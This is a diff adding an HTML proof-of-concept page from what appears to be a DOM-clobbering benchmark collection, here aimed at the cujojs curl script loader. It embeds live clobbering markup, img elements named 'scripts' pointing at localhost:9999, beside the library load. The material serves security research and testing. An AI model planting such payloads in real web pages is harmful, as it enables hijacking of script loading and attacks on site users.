@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - curl</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;scripts&quot; src=&quot;http://localhost:9999&quot;&gt;
+&lt;img name=&quot;scripts&quot; src=&quot;http://localhost:9999&quot;&gt;</pre>
+  <img name="scripts" src="http://localhost:9999">
+<img name="scripts" src="http://localhost:9999">
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script src=&quot;https://raw.githubusercontent.com/cujojs/curl/refs/heads/master/dist/curl/curl.js&quot;&gt;</pre>
+  <script src="https://raw.githubusercontent.com/cujojs/curl/refs/heads/master/dist/curl/curl.js">
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../cusdis/poc.html">Next: cusdis</a>
+  </div>
+</section>
+
+</body>
+</html>
